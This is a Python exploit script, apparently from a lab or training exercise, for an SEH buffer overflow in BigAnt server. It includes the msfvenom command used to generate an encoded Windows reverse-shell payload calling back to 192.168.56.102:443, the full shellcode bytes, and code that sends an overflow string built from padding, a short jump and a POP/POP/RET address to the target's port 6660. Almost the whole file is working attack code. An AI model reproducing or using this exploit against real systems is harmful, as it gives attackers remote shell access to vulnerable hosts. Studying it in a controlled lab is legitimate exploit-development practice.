#!/usr/bin/python
import socket 

'''

SEH: 0x0f9c4182, expsrv.dll
POP/POP/RET: JMP 015FFD84 --> EB 06 (jmp short to the shellcode)

root@kali:~/buffer_overflow/host_based/bigant# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 -b '\x00\x0a\x0d\x20\x25' -f python -e x86/shikata_ga_nai
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1684 bytes


root@kali:~/buffer_overflow/host_based/bigant# 


'''


buf =  ""
buf += "\xbf\x79\x9a\x85\x15\xdb\xc3\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x83\xeb\xfc\x31\x7b\x0e\x03\x02\x94\x67"
buf += "\xe0\x08\x40\xe5\x0b\xf0\x91\x8a\x82\x15\xa0\x8a\xf1"
buf += "\x5e\x93\x3a\x71\x32\x18\xb0\xd7\xa6\xab\xb4\xff\xc9"
buf += "\x1c\x72\x26\xe4\x9d\x2f\x1a\x67\x1e\x32\x4f\x47\x1f"
buf += "\xfd\x82\x86\x58\xe0\x6f\xda\x31\x6e\xdd\xca\x36\x3a"
buf += "\xde\x61\x04\xaa\x66\x96\xdd\xcd\x47\x09\x55\x94\x47"
buf += "\xa8\xba\xac\xc1\xb2\xdf\x89\x98\x49\x2b\x65\x1b\x9b"
buf += "\x65\x86\xb0\xe2\x49\x75\xc8\x23\x6d\x66\xbf\x5d\x8d"
buf += "\x1b\xb8\x9a\xef\xc7\x4d\x38\x57\x83\xf6\xe4\x69\x40"
buf += "\x60\x6f\x65\x2d\xe6\x37\x6a\xb0\x2b\x4c\x96\x39\xca"
buf += "\x82\x1e\x79\xe9\x06\x7a\xd9\x90\x1f\x26\x8c\xad\x7f"
buf += "\x89\x71\x08\xf4\x24\x65\x21\x57\x21\x4a\x08\x67\xb1"
buf += "\xc4\x1b\x14\x83\x4b\xb0\xb2\xaf\x04\x1e\x45\xcf\x3e"
buf += "\xe6\xd9\x2e\xc1\x17\xf0\xf4\x95\x47\x6a\xdc\x95\x03"
buf += "\x6a\xe1\x43\x83\x3a\x4d\x3c\x64\xea\x2d\xec\x0c\xe0"
buf += "\xa1\xd3\x2d\x0b\x68\x7c\xc7\xf6\xfb\x43\xb0\xc0\x9d"
buf += "\x2b\xc3\x30\x63\x17\x4a\xd6\x09\x77\x1b\x41\xa6\xee"
buf += "\x06\x19\x57\xee\x9c\x64\x57\x64\x13\x99\x16\x8d\x5e"
buf += "\x89\xcf\x7d\x15\xf3\x46\x81\x83\x9b\x05\x10\x48\x5b"
buf += "\x43\x09\xc7\x0c\x04\xff\x1e\xd8\xb8\xa6\x88\xfe\x40"
buf += "\x3e\xf2\xba\x9e\x83\xfd\x43\x52\xbf\xd9\x53\xaa\x40"
buf += "\x66\x07\x62\x17\x30\xf1\xc4\xc1\xf2\xab\x9e\xbe\x5c"
buf += "\x3b\x66\x8d\x5e\x3d\x67\xd8\x28\xa1\xd6\xb5\x6c\xde"
buf += "\xd7\x51\x79\xa7\x05\xc2\x86\x72\x8e\xf2\xcc\xde\xa7"
buf += "\x9a\x88\x8b\xf5\xc6\x2a\x66\x39\xff\xa8\x82\xc2\x04"
buf += "\xb0\xe7\xc7\x41\x76\x14\xba\xda\x13\x1a\x69\xda\x31"
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
connect=s.connect(('192.168.56.101',6660))
payload = 'USV ' + (('A' * 962) + "\xeb\x06\x90\x90" + "\x82\x41\x9c\x0f" + buf + ("D"*1187) )  + " \r\n\r\n" 
s.send(payload)
s.close()	
